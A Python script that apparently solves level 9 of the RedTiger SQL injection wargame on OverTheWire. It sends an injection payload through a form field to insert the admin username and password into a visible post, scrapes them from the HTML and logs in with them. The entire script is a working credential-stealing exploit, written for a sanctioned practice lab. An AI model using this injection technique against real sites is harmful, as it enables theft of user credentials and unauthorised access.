#!/usr/bin/env python3
import pickle
import tigers as tg
from bs4 import BeautifulSoup
import re
import tiger_cookies
from connect import my_request as req


def main():
    '''
    Target: Get the password of the admin.
    '''
    base_name = 'level9_users'
    url = "https://redtiger.labs.overthewire.org/level9.php"
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level9login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level9login=cooks[level])

    # Payload
    data = dict(autor='', title='',
                text="'), ((select username from level9_users limit 1), (select password from level9_users limit 1),'", post='Submit Query')
    response = req.post_request(url, data, cook)

    print(response)

    soup = BeautifulSoup(response, 'html.parser')
    autor = soup.find_all(string=re.compile(
        "Autor:"))[-1].replace('Autor: ', '')
    title = soup.find_all(string=re.compile(
        "Title:"))[-2].replace('Title: ', '')
    print(autor, title)

    # Authorization
    data = dict(user=autor, password=title, login='Login')
    response = tg.post_request(url, data, cook)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
